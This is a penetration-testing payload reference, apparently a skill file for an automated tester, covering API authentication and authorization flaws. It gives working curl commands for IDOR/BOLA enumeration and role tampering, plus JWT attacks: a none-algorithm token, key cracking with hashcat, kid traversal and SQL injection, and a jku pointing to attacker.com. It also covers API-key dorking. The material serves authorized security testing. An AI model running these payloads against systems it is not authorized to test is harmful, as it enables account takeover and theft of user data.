# API Authentication & Authorization Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify API authentication/authorization vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual unauthorized modification/deletion of data is prohibited
> - Authentication bypass payloads are for understanding attack surface only, **not for obtaining persistent access**
> - Validation proves vulnerability existence (unauthorized access), **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

API authentication/authorization vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| IDOR/BOLA | ✓ Read other user data | ✓ Modify/delete other user data | Malicious data destruction |
| Vertical Privilege Escalation | ✓ Access admin endpoint to prove accessibility | ✓ Execute admin operations | Persistent backdoor |
| JWT Bypass | ✓ Prove signature verification flaw | ✓ Use forged JWT for extended testing | Persistent unauthorized access |
| API Key Leakage | ✓ Discover leaked key location | ✓ Test key validity briefly | Use key for malicious operations |

---

## Unauthorized Access (BOLA/IDOR)

### Horizontal Privilege Escalation
```bash
# Replace user ID (user_id, account_id)
curl -X GET "https://api.example.com/v1/users/1002/profile" -H "Authorization: Bearer <user_1001_token>"

# Replace object ID (orders, documents, etc.)
curl -X GET "https://api.example.com/v1/documents/doc_8899" -H "Authorization: Bearer <user_token>"
```

### Vertical Privilege Escalation
```bash
# Normal user accessing admin endpoint
curl -X GET "https://api.example.com/v1/admin/users" -H "Authorization: Bearer <normal_user_token>"

# Modify role parameter (during registration or profile update)
curl -X PUT "https://api.example.com/v1/users/me" \
     -H "Authorization: Bearer <normal_user_token>" \
     -H "Content-Type: application/json" \
     -d '{"email":"user@example.com", "role":"admin", "isAdmin":true}'
```

### Batch Unauthorized Access
```bash
# Iterate IDs to retrieve other user data
for i in {1000..1050}; do
  curl -s -H "Authorization: Bearer <token>" "https://api.example.com/v1/users/$i" | grep -i "email"
done
```

## JWT Attacks

### Null Signature (None Algorithm)
```bash
# Header: {"alg":"none","typ":"JWT"} (Base64Url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)
# Payload: {"user":"admin"} (Base64Url: eyJ1c2VyIjoiYWRtaW4ifQ)
# Signature: empty
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://api.example.com/v1/admin
```

### Weak Key Cracking
```bash
# Crack using hashcat (mode 16500)
hashcat -a 0 -m 16500 jwt.txt passwords.txt

# Crack using john
john jwt.txt --wordlist=passwords.txt --format=HMAC-SHA256
```

### Algorithm Confusion (RS256 -> HS256)
```bash
# Obtain public key and use it as HS256 symmetric key to forge signature
# Tool: jwt_tool
python3 jwt_tool.py <JWT> -X a -k public.pem
```

### Unverified Signature
```bash
# Only modify Payload part, keep original Header and Signature
# Header.ModifiedPayload.OriginalSignature
```

### kid Injection
```bash
# Directory traversal (read local file as key)
{"alg":"HS256","typ":"JWT","kid":"../../../../../../../../dev/null"} # key is empty

# SQL injection (control key returned from database)
{"alg":"HS256","typ":"JWT","kid":"1' UNION SELECT 'key';--"} # key is 'key'
```

### jku/jwk Injection
```bash
# jku: point to attacker-controlled JWKS URL
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

# jwk: embed attacker's public key directly in Header
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

## API Key Leakage

### Hardcoded Detection
```bash
# GitHub Dorks
org:example "api_key" OR "apikey" OR "Authorization: Bearer"
filename:.env "API_KEY="

# Extract keys from JS files
curl -s https://example.com/app.js | grep -iE "api[_-]?key|token|secret"
```

### Key Enumeration/Cracking
```bash
# Try default/test keys
curl -H "X-API-Key: test" https://api.example.com/v1/data
curl -H "X-API-Key: default" https://api.example.com/v1/data
```

### Unexpired Key Reuse
```bash
# Test historically leaked keys or revoked user keys
curl -H "Authorization: Bearer <expired_or_revoked_token>" https://api.example.com/v1/data
```

## Analysis Process

1. Identify all authentication mechanisms (Cookie, Bearer Token, API Key, Custom Header)
2. Collect test accounts at different privilege levels (Admin, User A, User B, Unauthenticated)
3. Test horizontal privilege escalation (User A accessing User B data)
4. Test vertical privilege escalation (User A accessing Admin endpoints)
5. Extract JWT and analyze its structure, algorithm, and potential signature bypass vulnerabilities
6. Check frontend source code and public code repositories for hardcoded credentials

## Output

- Proof payload
- Complete request packet (HTTP format)
- Sensitive data fragments obtained through unauthorized access or screenshots of successful authentication bypass

## Severity Classification

API authentication bypass severity is based on "the value of resources reachable after bypass" — confirmed access to resources requiring authentication is required for High. 

| Actual case | Severity | Note |
|---------|------|------|
| Authentication bypass confirmed (no token/forged token can access resources requiring authentication, privilege escalation reads other users' data) | High | Authentication failure |
| authenticationlogic weakness without actual bypass (weakness exists but access is denied) | Medium | weakness not closed into impact |
| only discovery ofauthenticationinterface/mechanism (JWT parseable/API Key location visible but invalid) | Low | Informational |
| token expired/weak algorithm but not actually exploitable | Low | defense effective |
| bypasscan take over an administrator account after bypass / bulkprivilege escalationall users | Critical | large-scale account takeover |

**Key judgment**:Reporting High requires confirming"unauthorized access actually reached resources that should requireauthenticationresources". JWT being decodable only/`alg:none` being rejected by the server, record as Medium/Low. 

---

## Prohibited

- ⚠️ No destructive unauthorized modifications (e.g., deleting other users' data)
- ⚠️ No malicious operations using cracked high-privilege credentials
- ⚠️ Only prove existence + provide command/PoC